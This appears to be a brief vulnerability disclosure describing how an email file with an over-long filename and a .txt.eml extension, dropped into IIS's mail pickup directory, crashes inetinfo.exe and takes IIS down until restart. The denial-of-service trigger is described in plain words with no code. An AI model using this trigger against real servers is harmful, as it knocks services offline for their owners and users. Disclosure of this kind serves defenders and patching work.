An email with a filename consisting of over 86 characters and an extension of .txt.eml will cause Microsoft IIS to crash if placed in the \mailroot\pickup directory. The process inetinfo.exe will crash, resulting in a Dr. Watson access violation error. Restarting IIS is required in order to regain normal functionality.
